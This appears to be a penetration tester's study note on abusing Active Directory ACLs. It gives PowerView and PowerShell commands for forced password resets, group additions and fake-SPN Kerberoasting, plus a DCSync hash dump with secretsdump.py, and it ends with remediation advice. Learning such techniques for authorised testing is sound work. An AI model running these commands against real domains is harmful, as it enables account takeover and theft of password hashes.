```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
![[Active Directory#Access Control List (ACL)]]
![[Active Directory#Access Control Entries (ACEs)]]
![[Active Directory#Discretional ACL (DACL)]]
![[Active Directory#System ACL (SACL)]]

## Key ACEs that can be abused
- [ForceChangePassword](https://bloodhound.specterops.io/resources/edges/force-change-password#forcechangepassword) : Gives us the right to reset a user's password without knowing their original password (*best to tell the client before resetting passwords - they could be used for other purposes too*).
- [GenericWrite](https://bloodhound.specterops.io/resources/edges/generic-write#genericwrite) : This gives us rights to change/write any non-protected attribute on an object. Eg. we could add ourselves to a group, add an SPN to another user so we can [[Kerberoasting|kerberoast]] them.
- [AddSelf](https://bloodhound.specterops.io/resources/edges/add-self#addself) : Shows security groups that a user can add themselves too.
- [GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all#genericall) : Grants full control over a target object. If we have access to a computer that is using [[Windows#Local Administrator Password Solution (LAPS)|LAPS]] then we can get access to the password and obtain local administrator.
![[Pasted image 20250826144004.png]]
## ACL Enumeration
We can enumerate the ACLs of a domain/system to potentially gain further internal access. This can be done with [[Credentialed Enumeration#PowerView|PowerView]] and [[BloodHound]].
### Find all domain objects an SID controls
> this works for anything with an SID eg. users, groups, computers
```PowerShell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid [user]
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
> This gets all domain object ACLs, then matches the SecurityIdentifier field to the SID we provided.
> `-ResolveGUIDs` ensures that the ACL types are in a human readable formate rather than their GUIDs

> This command can take a bit of time, especially in large AD environments
#### Performing this without PowerView
> [Get-ADUser](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps)
> [Get-Acl](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.2)

**Create a list of domain users**
```PowerShell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

**Get ACL information for each user**
```PowerShell
foreach($line in [System.IO.File]::ReadLines("<domain_users>")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\<target_user>'}}
```

**Manually resolve the ObjectType GUID**
```PowerShell
$guid = "<guid>"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ? {$_.rightsGuid -eq $guid} | fl
```

### Identifying nested group
If a group is nested in another group, any users in the sub-group will obtain the rights given by the parent group. This can lead to excessive rights for users.
```PowerShell
Get-DomainGroup -Identity "<group_name>" | select memberof
```

## Useful ACL Abuse Processes
### Creating a PSCredential Object for another user
If we aren't logged in as another user, then we can use PSCredential objects to use them as a context for a PowerShell session
```PowerShell
$SecPassword = ConvertTo-SecureString '[pass]' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('[domain]/[user]', $SecPassword)
```

### Force change another user's password
```PowerShell
# Create a SecureString object that will house the new password
$NewPassword = ConvertTo-SecureString '[new_pass]' -AsPlainText -Force

# Force change the user's password with PowerView
# We use the $Cred variable from above to use another user's context (this is optional if we are already logged in as that user)
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity [user] -AccountPassword $NewPassword -Credential $Cred -Verbose
```

### Add a user to a group
```PowerShell
# You can view all members of a group with this
Get-ADGroup -Identity "[group]" -Properties * | Select -ExpandProperty Members

# Add a user
Add-DomainGroupMember -Identity '[group]' -Members '[user]' -Credential $UserPSCredential -Verbose

# Remove a user
Remove-DomainGroupMember -Identity '[group]' -Members '[user]' -Credential $UserPSCredential -Verbose
```

### Updating a domain object
If we have permission to write to another user eg. `GenericAll`, then we can add a temporary fake SPN to a user, [[Kerberoasting|Kerberoast]] them, and potentially crack their password. This is useful as it means we aren't changing passwords and therefore potentially causing disruption.
```PowerShell
Set-DomainObject -Credential $Cred -Identity [target_user] -SET @{serviceprinciplename='temporary/PENTEST'} -Verbose

# We should also clean up the changed SPN
Set-DomainObject -Credential $Cred -Identity [target_user] -Clear serviceprinciplename -Verbose
```

### Enumerate a 

## DCSync
DCSync is a technique for stealing an AD password database using the built-in *Directory Replication Service Remote Protocol*. This protocol allows DCs to replicate domain data. This attack could allow us to mimic a DC and retrieve user NTLM password hashes.

The core component of this attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right (*a right that allows the replication of secret data*). If we have control of an account with `Replicating Directory Changes` and `Replicating Directory Changes All` permissions, we can perform this attack.

### Check a user for the permissions required
> Using PowerView
```PowerShell
Get-DomainUser -Identity [user] | select samaccountname,objectsid,memberof | fl
```
This will give us the `DC` identifier that we need eg. `DC=INLANEFREIGHT,DC=LOCAL` and it will also give us the user's `SID`.
```PowerShell
$sid = "[user_sid]"
Get-DomainObjectAcl "[DC_identifier]" -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
This will then show us all the replication permissions for that user. We are looking for `DS-Replication-Get-Changes-All`.

> If we had certain other rights such as: [WriteDacl](https://bloodhound.specterops.io/resources/edges/write-dacl) then we could add this to our users and remove it to hide our tracks later.

### Using secretsdump.py
```bash
secretsdump.py -outputfile hashes -just-dc [domain]/[user]@[dc-ip]
```
> `-just-dc-ntlm` will give us only NTLM hashes, as opposed to also giving kerberos keys too
> `-just-dc-user` will only give data on a specific user
> `-pwd-last-set` will show when each account last reset its password
> `-history` will dump out the entire password history
> `-user-status` can be used to later filter out all disabled users

Occasionally, we may get a file containing cleartext passwords. This will be from any users that have the account option to store their password with [reversible encryption](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Even if this setting is disabled, a new password will need to be set. We can check for the `ENCRYPTED_TEXT_PWD_ALLOWED` useraccountcontrol:
```PowerShell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

### Using [[Mimikatz]]
![[Mimikatz#Abusing ACLs DCSync DCSync]]


## Remediation and Detection
### Regular auditing for dangerous ACLs
- Regularly check for dangerous ACL configurations and remove them
- Train up admin staff to use tools like bloodhound to identify dangerous attack paths

### Monitor group membership
- High-importance groups should be monitored for any changes that could indicate an attack
- Look out for nested groups and identify whether they are needed

### Audit and monitor for ACL changes
- Automate the monitoring and alerting for potentially dangerous changes in ACLs
- Enable [Advanced Security Audit Policy](https://docs.microsoft.com/en-us/archive/blogs/canitpro/step-by-step-enabling-advanced-security-audit-policy-via-ds-access)